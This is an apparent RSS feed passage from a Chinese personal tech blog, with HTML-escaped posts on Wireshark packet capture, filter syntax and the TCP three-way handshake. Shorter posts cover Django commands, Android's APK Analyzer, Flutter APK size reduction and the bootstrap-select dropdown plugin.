	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291751589.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291751589.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;打开 cmd 窗口，执行 ping 命令。工作中的 wireshark 将抓取到相关数据包，在过滤栏设置过滤条件以避免其他无用数据包影响分析，&lt;strong&gt;比如：ip.addr == 185.199.111.153 and icmp 表示只显示ICPM协议且源主机IP或者目的主机IP为185.199.111.153的数据包。说明：协议名称icmp要小写&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291751861.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291751861.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;0x04数据包详细信息&#34;&gt;0x04.数据包详细信息&lt;/h2&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291751676.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291751676.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Frame: 物理层的数据帧概况&lt;/li&gt;
&lt;li&gt;Ethernet II: 数据链路层以太网帧头部信息&lt;/li&gt;
&lt;li&gt;Internet Protocol Version 4: 互联网层IP包头部信息&lt;/li&gt;
&lt;li&gt;Transmission Control Protocol: 传输层T的数据段头部信息，此处是TCP&lt;/li&gt;
&lt;li&gt;Hypertext Transfer Protocol: 应用层的信息，此处是HTTP协议&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;0x05tcp包的具体内容&#34;&gt;0x05.TCP包的具体内容&lt;/h2&gt;
&lt;p&gt;从下图可以看到wireshark捕获到的TCP包中的每个字段。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291752278.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291752278.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;0x06抓包捕获过滤器语法和实例&#34;&gt;0x06.抓包（捕获）过滤器语法和实例&lt;/h2&gt;
&lt;p&gt;抓包过滤器有如：类型Type（host、net、port）、方向Dir（src、dst）、协议Proto（ether、ip、tcp、udp、http、icmp、ftp等）、逻辑运算符（&amp;amp;&amp;amp; 与、|| 或、！非）等的分类&lt;/p&gt;
&lt;h3 id=&#34;1协议过滤&#34;&gt;（1）协议过滤&lt;/h3&gt;
&lt;p&gt;直接在过滤框中输入协议名即可。 tcp，只显示TCP协议的数据包列表 ；http，只查看HTTP协议的数据包列表 ；icmp，只显示ICMP协议的数据包列表&lt;/p&gt;
&lt;h3 id=&#34;2ip过滤&#34;&gt;（2）IP过滤&lt;/h3&gt;
&lt;p&gt;host 192.168.1.104 ；src host 192.168.1.104 ；dst host 192.168.1.104&lt;/p&gt;
&lt;h3 id=&#34;3端口过滤&#34;&gt;（3）端口过滤&lt;/h3&gt;
&lt;p&gt;port 80 ；src port 80 ；dst port 80&lt;/p&gt;
&lt;h3 id=&#34;4逻辑运算符-与-或非&#34;&gt;（4）逻辑运算符&amp;amp;&amp;amp; 与、|| 或、！非&lt;/h3&gt;
&lt;p&gt;src host 192.168.1.104 &amp;amp;&amp;amp; dst port 80 抓取主机地址为192.168.1.80、目的端口为80的数据包； host 192.168.1.104 || host 192.168.1.102 抓取主机为192.168.1.104或者192.168.1.102的数据包 ；! broadcast 不抓取广播数据包&lt;/p&gt;
&lt;h2 id=&#34;0x07显示过滤器语法和实例&#34;&gt;0x07.显示过滤器语法和实例&lt;/h2&gt;
&lt;h3 id=&#34;1比较操作符&#34;&gt;（1）比较操作符&lt;/h3&gt;
&lt;p&gt;比较操作符有 == 等于、! = 不等于、&amp;gt; 大于、&amp;lt; 小于、&amp;gt;= 大于等于、&amp;lt;= 小于等于。&lt;/p&gt;
&lt;h3 id=&#34;2协议过滤&#34;&gt;（2）协议过滤&lt;/h3&gt;
&lt;p&gt;直接在Filter框中输入协议名即可。注意：协议名称需要输入小写。 tcp，只显示TCP协议的数据包列表 ；http，只查看HTTP协议的数据包列表；icmp，只显示ICMP协议的数据包列表&lt;/p&gt;
&lt;h3 id=&#34;3-ip过滤&#34;&gt;（3） ip过滤&lt;/h3&gt;
&lt;p&gt;ip.src ==192.168.1.104 显示源地址为192.168.1.104的数据包列表； ip.dst==192.168.1.104, 显示目标地址为192.168.1.104的数据包列表； ip.addr == 192.168.1.104 显示源IP地址或目标IP地址为192.168.1.104的数据包列表&lt;/p&gt;
&lt;h3 id=&#34;4端口过滤&#34;&gt;（4）端口过滤&lt;/h3&gt;
&lt;p&gt;tcp.port ==80, 显示源主机或者目的主机端口为80的数据包列表。 tcp.srcport == 80, 只显示TCP协议的源主机端口为80的数据包列表。 tcp.dstport == 80，只显示TCP协议的目的主机端口为80的数据包列表。&lt;/p&gt;
&lt;h3 id=&#34;5-http模式过滤&#34;&gt;（5） Http模式过滤&lt;/h3&gt;
&lt;p&gt;http.request.method==&amp;ldquo;GET&amp;rdquo;, 只显示HTTP GET方法的。&lt;/p&gt;
&lt;h3 id=&#34;6逻辑运算符为-andornot&#34;&gt;（6）逻辑运算符为 and/or/not&lt;/h3&gt;
&lt;p&gt;过滤多个条件组合时，使用and/or。比如获取IP地址为192.168.1.104的ICMP数据包表达式为 ip.addr == 192.168.1.104 and icmp&lt;/p&gt;
&lt;h3 id=&#34;7按照数据包内容过滤&#34;&gt;（7）按照数据包内容过滤。&lt;/h3&gt;
&lt;p&gt;假设我要以IMCP层中的内容进行过滤，可以单击选中界面中的码流，在下方进行选中数据。右键&amp;ndash;&amp;gt;准备过滤器&amp;ndash;&amp;gt;选中&amp;ndash;&amp;gt;添加条件表达式，如&lt;code&gt;data contains &amp;quot;uestc&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;0x08wireshark分析tcp协议三次握手&#34;&gt;0x08.Wireshark分析TCP协议三次握手&lt;/h2&gt;
&lt;h3 id=&#34;tcp三次握手连接建立过程&#34;&gt;TCP三次握手连接建立过程&lt;/h3&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291752094.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291752094.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第一次握手：建立连接时，客户端发送syn包（syn=j）到服务器，并进入SYN_SENT状态，等待服务器确认；SYN：同步序列编号（Synchronize Sequence Numbers）。&lt;/li&gt;
&lt;li&gt;第二次握手：服务器收到syn包，必须确认客户的SYN（ack=j+1），同时自己也发送一个SYN包（syn=k），即SYN+ACK包，此时服务器进入SYN_RECV状态；&lt;/li&gt;
&lt;li&gt;第三次握手：客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK(ack=k+1），此包发送完毕，客户端和服务器进入ESTABLISHED（TCP连接成功）状态，完成三次握手，客户端与服务器开始传送数据。 {% endtabs %}&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;wireshark抓取访问指定服务器数据包&#34;&gt;wireshark抓取访问指定服务器数据包&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;启动wireshark抓包，打开浏览器输入&lt;code&gt;www.cnblogs.com&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;终止抓包，输入 http 过滤&lt;/li&gt;
&lt;li&gt;隐藏其他无关http数据包，右键选中，追踪流——&amp;gt;TCP流，显示握手信息，如图所示：&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291752500.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291752500.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;可以看到这里截获了三个握手数据包，第四个是HTTP数据包，说明HTTP的确是使用TCP建立连接的。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;第一次&lt;/strong&gt;，客户端发送了一个TCP，标志位为SYN，序列号为0，表示客户端请求建立连接，如下：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291752958.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291752958.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;关键参数&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;SYN ：标志位，表示请求建立连接&lt;/li&gt;
&lt;li&gt;Seq = 0 ：初始建立连接值为0，数据包的相对序列号从0开始，表示当前还没有发送数据&lt;/li&gt;
&lt;li&gt;Ack = 0：初始建立连接值为0，已经收到包的数量，表示当前没有接收到数据&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;第二次&lt;/strong&gt;，服务器发回确认包, 标志位为 SYN,ACK. 将确认序号(Acknowledgement Number)设置为客户的ISN加1以.即0+1=1, 如下图如下：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291753715.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291753715.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;关键参数&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;SYN + ACK：标志位，同意建立连接，并回送SYN+ACK&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Seq = 0 ：初始建立值为0，表示当前还没有发送数据&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Ack = 1：表示当前端成功接收的数据位数，虽然客户端没有发送任何有效数据，确认号还是被加1，因为包含SYN或FIN标志位。（并不会对有效数据的计数产生影响，因为含有SYN或FIN标志位的包并不携带有效数据）&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;第三次&lt;/strong&gt;，客户端再次发送确认包(ACK) SYN标志位为0,ACK标志位为1.并且把服务器发来ACK的序号字段+1,放在确定字段中发送给对方.并且在数据段放写ISN的+1，如下图如下：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291753661.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291753661.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;关键参数&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ACK ：标志位，表示已经收到记录&lt;/li&gt;
&lt;li&gt;Seq = 1 ：表示当前已经发送1个数据&lt;/li&gt;
&lt;li&gt;Ack = 1 : 表示当前端成功接收的数据位数，虽然服务端没有发送任何有效数据，确认号还是被加1，因为包含SYN或FIN标志位（并不会对有效数据的计数产生影响，因为含有SYN或FIN标志位的包并不携带有效数据)。&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        <item>
        <title>Django—Bash 命令</title>
        <link>https://ac-lm.github.io/posts/django/djangobash-%E5%91%BD%E4%BB%A4/</link>
        <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/django/djangobash-%E5%91%BD%E4%BB%A4/</guid>
        <description>&lt;h2 id=&#34;1安装&#34;&gt;1.安装&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;pip install django
python &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;m django &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;version
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2配置项目&#34;&gt;2.配置项目&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;django&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;admin startproject 项目名称
python manage&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py startapp 应用名称
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3启动服务器&#34;&gt;3.启动服务器&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;python manage&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py runserver
python manage&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py runserver &lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt;
python manage&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py runserver &lt;span style=&#34;color:#ae81ff&#34;&gt;0.0.0.0&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;8000&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4初始化数据库&#34;&gt;4.初始化数据库&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;python manage&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py makemigrations 应用名称 &lt;span style=&#34;color:#75715e&#34;&gt;#记录改动&lt;/span&gt;
python manage&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py migrate &lt;span style=&#34;color:#75715e&#34;&gt;#创建表&lt;/span&gt;
python manage&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py createsuperuser
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;5创建用户&#34;&gt;5.创建用户&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;python manage&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py shell
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; django.contrib.auth.models &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; User
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; user&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;User&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;create_user(username&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;user1&amp;#39;&lt;/span&gt;,password&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;12345678&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Android—APK Analyzer</title>
        <link>https://ac-lm.github.io/posts/android/androidapk-analyzer/</link>
        <pubDate>Wed, 09 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/android/androidapk-analyzer/</guid>
        <description>&lt;h2 id=&#34;1apk-analyzer&#34;&gt;1.APK Analyzer&lt;/h2&gt;
&lt;p&gt;APK Analyzer 是 Android Studio 提供的 APK 包分析工具，可以打开并审查存于你电脑中的 APK 文件的内容。APK Analyzer 是一个非常好的工具来分析 APK 文件的结构，并同时在发布前或调试时验证一些常见问题，例如 APK 大小和 DEX 问题。&lt;/p&gt;
&lt;p&gt;APK Analyzer 可以在 Android Studio 顶端菜单栏中的 Build 找到。&lt;/p&gt;
&lt;h2 id=&#34;2利用-apk-analyzer-为应用瘦身&#34;&gt;2.利用 APK Analyzer 为应用瘦身&lt;/h2&gt;
&lt;p&gt;APK Analyzer 在应用大小方面可以给你很多有用并且可操作的信息。比如你可以从 Raw File Size 看到应用占磁盘大小。Download size 是一个估计值，表示考虑到在经过 Play Store 的压缩后，你还需要多少流量来下载应用。&lt;/p&gt;
&lt;p&gt;文件和文件夹根据文件大小降序排列。这让我们很容易看出对 APK 大小优化最容易从哪里入手。每当你深入到某个文件夹的时候，你能看到占用了 APK 大部分空间的资源和其他实体。资源根据文件大小以降序的方式排列。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;参考文档：&lt;a class=&#34;link&#34; href=&#34;https://zhuanlan.zhihu.com/p/24262346&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; 译.利用好 Android Studio 中的 APK Analyzer  @Glowin &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>Flutter—apk 瘦身</title>
        <link>https://ac-lm.github.io/posts/flutter/flutterapk-%E7%98%A6%E8%BA%AB/</link>
        <pubDate>Wed, 09 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/flutter/flutterapk-%E7%98%A6%E8%BA%AB/</guid>
        <description>&lt;h2 id=&#34;1打包&#34;&gt;1.打包&lt;/h2&gt;
&lt;p&gt;Flutter 在打包编译时，会根据 CPU 架构（x86_64、arm64-v8a、armeabi-v7a）的不同打出对应的二进制库，体现在 apk 的 lib 文件中。&lt;/p&gt;
&lt;p&gt;PS：x86_64 一般是模拟器和平板使用， arm64-v8a 就是 arm 64 位，大部分新手机使用。 armeabi 虽然不是现在主流的 CPU 架构，但是高版本的都会对其进行兼容，所以主流的 App 如果只想发一个版本的上线，可以只使用 armeabi 。&lt;/p&gt;
&lt;p&gt;使用命令&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;flutter build apk --release --target-platform android-arm
&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;flutter build apk --target-platform android-arm,android-arm64,android-x64 --split-per-abi
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>Web开发—下拉表单插件 bootstrap-select</title>
        <link>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%91%E4%B8%8B%E6%8B%89%E8%A1%A8%E5%8D%95%E6%8F%92%E4%BB%B6-bootstrap-select/</link>
        <pubDate>Sun, 06 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%91%E4%B8%8B%E6%8B%89%E8%A1%A8%E5%8D%95%E6%8F%92%E4%BB%B6-bootstrap-select/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考文献：&lt;a class=&#34;link&#34; href=&#34;https://github.com/silviomoreto/bootstrap-select&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; github.com-bootstrap-select @silviomoreto &lt;/a&gt;  &amp;amp; &lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/landeanfen/p/7457283.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; blogs @懒得安分&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1引用&#34;&gt;1.引用&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;link&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;href&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Content/bootstrap/css/bootstrap.min.css&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;rel&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stylesheet&amp;#34;&lt;/span&gt; /&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;link&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;href&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Content/bootstrap-select/css/bootstrap-select.min.css&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;rel&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stylesheet&amp;#34;&lt;/span&gt; /&amp;gt;

&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Content/jquery-1.9.1.min.js&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Content/bootstrap/js/bootstrap.min.js&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Content/bootstrap-select/js/bootstrap-select.min.js&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2使用&#34;&gt;2.使用&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;selectpicker&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;multiple&lt;/span&gt;&amp;gt;
    &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;option&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;&amp;gt;广东省&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;option&lt;/span&gt;&amp;gt;
    &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;option&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2&amp;#34;&lt;/span&gt;&amp;gt;广西省&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;option&lt;/span&gt;&amp;gt;
    &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;option&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;3&amp;#34;&lt;/span&gt;&amp;gt;福建省&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;option&lt;/span&gt;&amp;gt;
    &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;option&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;4&amp;#34;&lt;/span&gt;&amp;gt;湖南省&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;option&lt;/span&gt;&amp;gt;
    &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;option&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;5&amp;#34;&lt;/span&gt;&amp;gt;山东省&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;option&lt;/span&gt;&amp;gt;                            
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;select&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3取值&#34;&gt;3.取值&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;var value = $(&#39;#sel&#39;).val();&lt;/code&gt; ，需要注意的是，如果是多选，这里得到的 value 变量是一个数组变量，形如 &lt;code&gt;[&#39;1&#39;,&#39;2&#39;,&#39;3&#39;]&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;4赋值&#34;&gt;4.赋值&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;$&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.selectpicker&amp;#39;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;selectpicker&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;val&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;注意，所操作的值为 option 的 value 属性&lt;/p&gt;
&lt;p&gt;在一些级联选择的使用场景中，若需要在赋值的时候触发组件的 change 事件，可以：&lt;/p&gt;
